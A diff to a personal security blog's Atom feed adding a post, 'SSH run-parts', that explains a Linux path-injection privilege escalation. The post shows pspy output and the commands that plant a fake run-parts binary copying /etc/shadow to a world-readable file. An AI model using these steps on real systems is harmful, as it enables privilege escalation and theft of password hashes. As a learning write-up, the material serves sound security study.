@@ -4,13 +4,64 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-02-22T18:05:43+08:00</updated>
+ <updated>2022-02-23T18:14:53+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>SSH run-parts</title>
+   <link href="https://mvineza.github.io/spindel/2022/02/23/ssh-run-parts"/>
+   <updated>2022-02-23T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/02/23/SSH-Run-Parts</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-parts&lt;/code&gt; is being run by root whenever a successful ssh login completes. Attacker can crafyt a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-parts&lt;/code&gt; binary if he can override system paths such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/sbin&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This is a type of path injection attack.&lt;/p&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Ensure you have write permission to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/sbin&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pspy&lt;/code&gt;  to monitor the process inside victim machine. Open another terminal and SSH to victim again.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pspy &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...redacted...]
+2021/11/05 23:59:17 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2090   | sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/bin/env &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts &lt;span class=&quot;nt&quot;&gt;--lsbsysinit&lt;/span&gt; /etc/update-motd.d &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /run/motd.dynamic.new 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...redacted...]
+
+&lt;span class=&quot;c&quot;&gt;# 2 things to notice:&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#  - run-parts is not using full path&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#  - it is running as UID=0 which is root&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Craft malicuous binary&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#!/bin/bash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/local/sbin/run-parts
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'cp /etc/shadow /tmp; chmod +r /tmp/shadow'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/local/sbin/run-parts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Try SSH login again. You should be able to read now the shadow file.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;some-takeways&quot;&gt;Some takeways&lt;/h2&gt;
+&lt;p&gt;Even on modern linux systems, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-parts&lt;/code&gt; still have this behaviour. As an example, here is what I saw from my kali machine.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  linux &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;run-parts
+17 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	root    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.hourly
+25 6	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	root	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.daily &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+47 6	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 7	root	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.weekly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+52 6	1 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	root	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.monthly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+➜  linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Network Scripts Command Injection</title>
